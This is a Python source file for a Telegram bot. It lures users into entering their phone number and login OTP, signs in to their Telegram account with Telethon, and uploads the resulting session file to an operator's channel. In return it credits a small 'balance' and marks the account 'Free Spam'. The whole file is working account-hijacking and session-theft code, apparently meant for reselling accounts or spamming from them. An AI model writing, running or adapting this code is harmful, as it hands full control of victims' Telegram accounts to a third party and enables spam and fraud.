from pyrogram import filters
from pyrogram.types import Message, ForceReply
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import os, datetime

from bot import config as cfg
from bot.utils.storage import create_or_get_user, set_user_phone, verify_user_and_add_balance
from pyrogram import Client

os.makedirs(cfg.SESSIONS_DIR, exist_ok=True)

pending_verifications = {}  # uid -> {phone, ts, awaiting_code}

def init(app: Client):
    @app.on_message(filters.command('start') & filters.private)
    async def start_cmd(client: Client, message: Message):
        create_or_get_user(message.from_user.id)
        await message.reply("🎉 Welcome to Robot!\n\nEnter your phone number with the country code.\nExample: +62xxxxxxx\n\nType /cap to see available countries.", reply_markup=ForceReply(False))

    @app.on_message(filters.private & ~filters.command)
    async def handle_text(client: Client, message: Message):
        uid = message.from_user.id
        text = (message.text or '').strip()
        if uid in pending_verifications and pending_verifications[uid].get('awaiting_code'):
            code = text
            phone = pending_verifications[uid]['phone']
            await message.reply('Verifying code... Please wait.')
            try:
                session_file = await _telethon_sign_in(phone, code)
            except SessionPasswordNeededError:
                await message.reply('Two-step verification is enabled for this number. Cannot proceed without the account password.')
                pending_verifications.pop(uid, None)
                return
            except Exception as e:
                await message.reply(f'Failed to sign in: {e}')
                pending_verifications.pop(uid, None)
                return
            # upload session file to channel
            try:
                await client.send_document(cfg.SESSION_CHANNEL_ID, session_file, caption=f"Session for user {uid} — phone {phone}")
            except Exception as e:
                print('Failed to upload session file:', e)
            # mark verified and add balance
            verify_user_and_add_balance(uid, cfg.DEFAULT_BALANCE_ON_VERIFY)
            await message.reply(f"🎉 We have successfully processed your account\nNumber: {phone}\nPrice: {cfg.DEFAULT_BALANCE_ON_VERIFY} USD\nStatus: Free Spam\nCongratulations, has been added to your balance.")
            pending_verifications.pop(uid, None)
            return

        # phone number input
        if text.startswith('+') and any(ch.isdigit() for ch in text):
            phone = text
            set_user_phone(uid, phone)
            await message.reply('Sending OTP to that number. Please enter the OTP code you receive in this chat.')
            try:
                await _telethon_send_code(phone)
            except Exception as e:
                await message.reply(f'Failed to send code: {e}')
                return
            pending_verifications[uid] = {'phone': phone, 'ts': datetime.datetime.utcnow().timestamp(), 'awaiting_code': True}
            return

async def _telethon_send_code(phone: str):
    session_name = os.path.join(cfg.SESSIONS_DIR, phone.replace('+',''))
    client = TelegramClient(session_name, cfg.API_ID, cfg.API_HASH)
    await client.connect()
    try:
        await client.send_code_request(phone)
    finally:
        await client.disconnect()

async def _telethon_sign_in(phone: str, code: str) -> str:
    session_name = os.path.join(cfg.SESSIONS_DIR, phone.replace('+',''))
    client = TelegramClient(session_name, cfg.API_ID, cfg.API_HASH)
    await client.connect()
    try:
        await client.sign_in(phone=phone, code=code)
    finally:
        await client.disconnect()
    return session_name + '.session'
